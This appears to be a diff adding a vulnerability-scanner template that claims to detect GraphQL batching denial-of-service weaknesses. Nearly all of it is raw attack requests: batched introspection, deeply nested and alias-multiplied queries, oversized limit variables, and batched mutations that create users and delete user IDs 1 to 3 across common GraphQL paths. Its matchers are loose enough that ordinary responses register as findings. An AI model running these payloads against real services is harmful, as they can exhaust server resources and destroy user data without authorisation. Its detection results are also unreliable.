@@ -1,0 +1,342 @@
+id: medium-webapp-graphql-batching-dos-attack
+
+info:
+  name: GraphQL Batching DoS Attack
+  author: elite-red-team
+  severity: high
+  description: |
+    Detects GraphQL endpoints vulnerable to Denial of Service attacks through query batching.
+    Attackers can send multiple expensive queries in a single request to overwhelm the server
+    and cause resource exhaustion, leading to service unavailability.
+  reference:
+    - https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/12-API_Testing/01-Testing_GraphQL
+    - https://blog.doyensec.com/2018/05/17/graphql-security-overview.html
+    - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
+    cvss-score: 7.5
+    cwe-id: CWE-400
+  tags: graphql,dos,batching,resource-exhaustion,medium
+
+http:
+  - raw:
+      - |
+        POST {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        
+        [
+          {"query": "query { __schema { types { name } } }"},
+          {"query": "query { __schema { types { name } } }"},
+          {"query": "query { __schema { types { name } } }"},
+          {"query": "query { __schema { types { name } } }"},
+          {"query": "query { __schema { types { name } } }"},
+          {"query": "query { __schema { types { name } } }"},
+          {"query": "query { __schema { types { name } } }"},
+          {"query": "query { __schema { types { name } } }"},
+          {"query": "query { __schema { types { name } } }"},
+          {"query": "query { __schema { types { name } } }"}
+        ]
+
+      - |
+        POST {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        
+        [
+          {"query": "query { users { id name email posts { id title content comments { id text author { name } } } } }"},
+          {"query": "query { users { id name email posts { id title content comments { id text author { name } } } } }"},
+          {"query": "query { users { id name email posts { id title content comments { id text author { name } } } } }"},
+          {"query": "query { users { id name email posts { id title content comments { id text author { name } } } } }"},
+          {"query": "query { users { id name email posts { id title content comments { id text author { name } } } } }"}
+        ]
+
+    payloads:
+      path:
+        - "/graphql"
+        - "/api/graphql"
+        - "/v1/graphql"
+        - "/v2/graphql"
+        - "/admin/graphql"
+        - "/query"
+        - "/api/query"
+        - "/gql"
+        - "/api/gql"
+        - "/graph"
+
+    attack: pitchfork
+    threads: 5
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 400
+          - 429
+          - 500
+
+      - type: word
+        words:
+          - "data"
+          - "errors"
+          - "extensions"
+          - "graphql"
+          - "__schema"
+          - "types"
+        condition: or
+        case-insensitive: true
+
+    extractors:
+      - type: regex
+        name: graphql_response
+        regex:
+          - '(?i)("data"|"errors"|"extensions")'
+          - '(?i)("__schema"|"types"|"fields")'
+
+      - type: regex
+        name: error_messages
+        regex:
+          - '(?i)(rate.*limit|too.*many|timeout|resource.*exhausted)'
+
+# Heavy nested query batching
+  - raw:
+      - |
+        POST {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        
+        [
+          {"query": "query { posts { comments { author { posts { comments { author { posts { comments { text } } } } } } } }"},
+          {"query": "query { posts { comments { author { posts { comments { author { posts { comments { text } } } } } } } }"},
+          {"query": "query { posts { comments { author { posts { comments { author { posts { comments { text } } } } } } } }"},
+          {"query": "query { posts { comments { author { posts { comments { author { posts { comments { text } } } } } } } }"},
+          {"query": "query { posts { comments { author { posts { comments { author { posts { comments { text } } } } } } } }"}
+        ]
+
+    payloads:
+      path:
+        - "/graphql"
+        - "/api/graphql"
+        - "/query"
+
+    attack: pitchfork
+    threads: 3
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 400
+          - 500
+          - 503
+
+      - type: word
+        words:
+          - "data"
+          - "errors"
+          - "timeout"
+          - "complexity"
+          - "depth"
+        condition: or
+        case-insensitive: true
+
+    extractors:
+      - type: regex
+        name: nested_query_response
+        regex:
+          - '(?i)(timeout|complexity.*exceeded|depth.*exceeded|too.*complex)'
+
+# Alias-based query multiplication
+  - raw:
+      - |
+        POST {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        
+        [
+          {"query": "query { a1:users{id} a2:users{id} a3:users{id} a4:users{id} a5:users{id} a6:users{id} a7:users{id} a8:users{id} a9:users{id} a10:users{id} }"},
+          {"query": "query { b1:posts{id} b2:posts{id} b3:posts{id} b4:posts{id} b5:posts{id} b6:posts{id} b7:posts{id} b8:posts{id} b9:posts{id} b10:posts{id} }"},
+          {"query": "query { c1:comments{id} c2:comments{id} c3:comments{id} c4:comments{id} c5:comments{id} c6:comments{id} c7:comments{id} c8:comments{id} c9:comments{id} c10:comments{id} }"}
+        ]
+
+    payloads:
+      path:
+        - "/graphql"
+        - "/api/graphql"
+
+    attack: pitchfork
+    threads: 3
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 400
+          - 429
+
+      - type: word
+        words:
+          - "data"
+          - "errors"
+          - "alias"
+          - "rate"
+          - "limit"
+        condition: or
+        case-insensitive: true
+
+    extractors:
+      - type: regex
+        name: alias_response
+        regex:
+          - '(?i)(a1|b1|c1|alias)'
+
+# Large batch with introspection queries
+  - raw:
+      - |
+        POST {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        
+        [
+          {"query": "query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description locations args { ...InputValue } } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } } }"},
+          {"query": "query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description locations args { ...InputValue } } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } } }"},
+          {"query": "query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description locations args { ...InputValue } } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } } }"}
+        ]
+
+    payloads:
+      path:
+        - "/graphql"
+        - "/api/graphql"
+
+    attack: pitchfork
+    threads: 2
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 400
+          - 413
+          - 500
+
+      - type: word
+        words:
+          - "__schema"
+          - "IntrospectionQuery"
+          - "data"
+          - "errors"
+          - "too large"
+        condition: or
+        case-insensitive: true
+
+    extractors:
+      - type: regex
+        name: introspection_response
+        regex:
+          - '(?i)(__schema|IntrospectionQuery|too.*large|payload.*too.*large)'
+
+# Mutation batching attack
+  - raw:
+      - |
+        POST {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        
+        [
+          {"query": "mutation { createUser(input: {name: \"test1\", email: \"test1@example.com\"}) { id } }"},
+          {"query": "mutation { createUser(input: {name: \"test2\", email: \"test2@example.com\"}) { id } }"},
+          {"query": "mutation { createUser(input: {name: \"test3\", email: \"test3@example.com\"}) { id } }"},
+          {"query": "mutation { createUser(input: {name: \"test4\", email: \"test4@example.com\"}) { id } }"},
+          {"query": "mutation { createUser(input: {name: \"test5\", email: \"test5@example.com\"}) { id } }"},
+          {"query": "mutation { deleteUser(id: \"1\") { success } }"},
+          {"query": "mutation { deleteUser(id: \"2\") { success } }"},
+          {"query": "mutation { deleteUser(id: \"3\") { success } }"}
+        ]
+
+    payloads:
+      path:
+        - "/graphql"
+        - "/api/graphql"
+
+    attack: pitchfork
+    threads: 2
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 400
+          - 403
+          - 429
+
+      - type: word
+        words:
+          - "data"
+          - "errors"
+          - "mutation"
+          - "createUser"
+          - "deleteUser"
+        condition: or
+        case-insensitive: true
+
+    extractors:
+      - type: regex
+        name: mutation_response
+        regex:
+          - '(?i)(createUser|deleteUser|mutation)'
+
+      - type: regex
+        name: rate_limit_response
+        regex:
+          - '(?i)(rate.*limit|too.*many.*requests|throttled)'
+
+# Resource exhaustion with large variables
+  - raw:
+      - |
+        POST {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        
+        [
+          {"query": "query($limit: Int) { users(limit: $limit) { id name } }", "variables": {"limit": 999999}},
+          {"query": "query($limit: Int) { posts(limit: $limit) { id title } }", "variables": {"limit": 999999}},
+          {"query": "query($limit: Int) { comments(limit: $limit) { id text } }", "variables": {"limit": 999999}}
+        ]
+
+    payloads:
+      path:
+        - "/graphql"
+        - "/api/graphql"
+
+    attack: pitchfork
+    threads: 2
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 400
+          - 413
+          - 500
+
+      - type: word
+        words:
+          - "data"
+          - "errors"
+          - "limit"
+          - "variables"
+          - "too large"
+        condition: or
+        case-insensitive: true
+
+    extractors:
+      - type: regex
+        name: variable_response
+        regex:
+          - '(?i)(limit.*exceeded|too.*large|resource.*exhausted)'
